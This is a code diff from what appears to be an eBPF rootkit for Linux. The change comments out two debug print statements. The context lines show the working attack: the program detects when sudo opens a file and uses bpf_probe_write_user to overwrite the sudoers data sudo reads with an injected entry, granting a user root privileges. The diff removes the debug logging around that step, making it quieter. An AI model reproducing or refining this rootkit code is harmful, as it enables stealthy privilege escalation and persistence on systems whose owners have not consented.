@@ -102,7 +102,7 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
     //For including an user in the sudoers file
     //We just put our new line there, independently on what the rest of the file contains
     if(data->is_sudo==1){
-        bpf_printk("Proceeding to verwrite sudo\n");
+        //bpf_printk("Proceeding to verwrite sudo\n");
         if(bpf_probe_write_user((void*)buf, (void*)sudo_line_overwrite, (__u32)STRING_FS_SUDOERS_ENTRY_LEN-1)<0){
             bpf_printk("Error writing to user memory\n");
             return -1;
@@ -201,7 +201,7 @@ static __always_inline int handle_tp_sys_enter_openat(struct sys_openat_enter_ct
 
     data.is_sudo = 1;
     bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_ANY);
-    bpf_printk("It was a sudo!\n");
+    //bpf_printk("It was a sudo!\n");
 
     return 0;
 
